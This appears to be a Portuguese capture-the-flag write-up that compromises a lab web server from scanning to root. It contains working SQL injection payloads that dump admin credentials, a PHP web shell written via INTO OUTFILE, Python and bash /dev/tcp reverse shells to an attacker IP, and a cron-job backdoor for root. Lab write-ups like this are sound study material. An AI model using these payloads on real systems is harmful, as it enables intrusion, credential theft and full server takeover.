## Varredura nmap:

Como primeiro passo precisamos saber quais serviços estão sendo executados nos bastidores e quais portas estão abertas.
Então, vamos usar uma ferramenta chamada  **nmap.
Ports:**

```
Porta 22 - SSH
Porta 80 - HTTP
Porta 111 - RCPBIND
Porta 3306 - MYSQL
```
## Varredura ffuf:

Usaremos uma ferramenta chamada  **ffuf** , que usa uma lista de palavras existente de possíveis nomes de diretórios comuns e
tentará carregar todos os nomes de diretórios nessa lista de palavras e, então, olhará o código de status.(Se estiver usando
Kali ou ParrotOS, você pode encontrar essas listas de palavras em /usr/share/wordlists/dirbuster)


Temos a página de administração → **/admin** , mas não temos a senha.
Infelizmente, o campo **login** não está vulnerável a **SQLi.**

**search.php**


Temos um campo **"Search"** , vou escrever a palavra **"teste"** neste campo.
E ao passar teste para esse campo, ele nos retorna a **primeira flag** =)

## SQL Injection

O próximo passo é tentaremos injetar alguns comandos de **SQLi** pra verificar se esse parâmetro é vulnerável a **SQL
injection.**
Primeiro, precisamos identificar o número de colunas da tabela.


```
' union select 1,2,3,4,5,6#
```
Não retornou nada, vamos aumentar o número das colunas.

```
' union select 1,2,3,4,5,6,7#
```
Certo, aparentemente temos **7** colunas, e o número **2** foi refletido, vamos usar a coluna **2** para obter informações do banco de
dados, usarei o seguinte comando para ver qual é a versão do banco de dados.

```
' union select 1,@@version,3,4,5,6,7#
```

O resultado da consulta é **5.5.68-Maria-DB** , agora irei pegar o nome do banco de dados.

```
' union select 1,database(),3,4,5,6,7#
```
Temos o nome do banco de dados, agora pegarei os nomes das tabelas desse banco de dados.

```
' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema = 'news'#
```

**tbladmin
tblcategory
tblcomments
tblpages
tblposts
tblsubcategory**

Temos os nomes das 6 tabelas, a tabela mais importante para nós é a tabela " **tbladmin** ", então iremos listar as colunas dessa
tabela.

```
' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'tbladmin'#
```

**id
AdminUserName
AdminPassword
AdminEmailid
Is_Active
CreationDate
UpdationDate**

Para nós as mais importantes são **AdminUserName & AdminPassword,** então irei pegar os valores dessas, aqui vamos usar
a função **concat** que me permite adicionar duas ou mais expressões juntas.

```
' union select 1,concat(AdminUserName,":",AdminPassword),3,4,5,6,7 from tbladmin#
```
_O_ **_Bcrypt_** _oferece uma maior segurança do que os outros algoritmos criptográficos porque contém uma variável que é
proporcional à quantidade de processamento necessário para criptografar a informação desejada, tornando-o resistente a
ataques do tipo “força-bruta”._


Portanto não será possível quebrar esse **hash** 😧
Mas, como temos **Injeção de SQL** , podemos tentar escrever uma webshell **php** em algum diretório que temos permissão de
escrita.
**Payload:**

```
<?php system($_GET['cmd']) ?>
```
Depois de testar alguns diretórios, como:
/var/www/html
/var/www/html/images
/var/www/html/vendor
Consigo gravar no diretório **/var/www/html/includes** o arquivo **cmd.php** que contém a payload.
Comando **SQL** utilizado para gravar o arquivo:

```
'union select 1,"<?php system($_GET['cmd']) ?>",3,4,5,6,7 into outfile "/var/www/html/includes/cmd.php"#
```
Portanto se acessarmos **/includes,** veremos que nosso arquivo foi gravado com sucesso =).

Para executar comandos no sistema iremos passar **/includes/cmd.php?cmd** = **<comando>**
Aqui vou utilizar o comando **id**

```
http://$site/includes/cmd.php?cmd=id
```

Ok, temos execução de código remoto **(RCE)** no servidor, próximo passo será pegar uma **reverse shell**.
Para isso, vamos utilizar o comando **whereis python**

```
http://$site/includes/cmd.php?cmd=whereis python
```

Ok, temos **python2** no servidor, então, utilizaremos uma reverse shell em python2:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-VPN>",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
Ouvinte do netcat para recebermos a conexão:

```
http://$site/includes/cmd.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-VPN>",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
E recebemos a conexão 😀


## Shell tty

Atualizando shell simples para TTYs totalmente interativos.

```
python -c "import pty;pty.spawn('/bin/bash')"
Ctrl+Z
stty raw -echo;fg
Enter
export TERM=xterm
```
Indo na raiz → / do sistema encontramos a nossa **segunda flag.**

## Privesc

h **ttps://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
LinPEA** S é um script que procura caminhos possíveis para escalar privilégios em hosts Linux / Unix * / MacOS. As
verificações são explicadas em **https://book.hacktricks.xyz/linux-unix/privilege-escalation.**
Baixando o **LinPEAS na nossa máquina.**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

Agora, iremos subir um servidor em python na nossa máquina para podermos enviar o **LinPEAS** pro servidor que nós
comprometemos.

No servidor que comprometemos, iremos dar os seguintes comandos:

```
cd /tmp
wget http://<IP-VPN>/linpeas.sh
chmod +x linpeas.sh
```
```
./linpeas.sh
```

## Escalonamento de privilégios do Linux explorando Cronjobs:

### O que é um cron job?

_Os_ **_Cron Jobs_** _são usados para agendar tarefas executando comandos em datas e horários específicos no servidor. Eles são
mais comumente usados para tarefas de administrador de sistemas, como backups ou limpeza de diretórios /tmp/ e assim por
diante. A palavra Cron vem do crontab e está presente no diretório /etc._
Indo até **/opt/lion** temos um arquivo **lion.bakcup.sh** que é um cronjob do usuário root.
E pra nossa felicidade, temos permissão de escrita nesse arquivo.
Podemos colocar uma shell reversa dentro desse arquivo.
Como é um cronjob do usuário **root** , esse arquivo está configurado para ser executado a cada 1 minuto.

Agora iremos editar esse arquivo e colocar nossa reverse shell.
**Payload:**

```
#!/bin/bash
/bin/bash -c 'sh -i >& /dev/tcp/<IP-VPN>/1337 0>&1'
```

Após salvar, iremos abrir o ouvinte do netcat para podermos receber a conexão:

Agora basta esperar 1 minuto, que é o tempo de execução que está configurado no cron job.
E temos shell de root =), agora basta ler a **última flag.**


